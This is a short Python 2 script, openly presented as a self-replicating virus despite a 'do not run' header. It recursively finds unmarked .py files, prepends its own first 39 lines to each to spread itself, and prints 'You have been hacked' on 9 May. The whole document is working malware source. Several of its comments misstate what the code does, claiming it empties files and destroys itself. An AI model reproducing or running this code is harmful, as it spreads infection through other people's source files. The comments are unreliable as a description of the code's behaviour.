# Do not run this code!!!!

#!/usr/bin/python

# This script is using the os and datetime library by using the import command
import os
import datetime
# Defining signature
SIGNATURE = "VIRUS"
# First function
# This functions job is to find all filenames in the filelist from the os library and prepare the files for infection by using the "SIGNATURE" which means "VIRUS"
# This function will then seek files that are infected and aren't and it will append the targeted files if they aren't infected and return the targeted files
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted
# Second function
# This functions job is to then infect all targeted files and mess them up by writing the files to be completely empty and then closing the files
# This is a pretty evil virus
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# Last function
# This last functions job is to "detonate" (destroy the virus file) and basically tell the victim on the 9th of May that they have been hacked
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
# This is a powerful virus
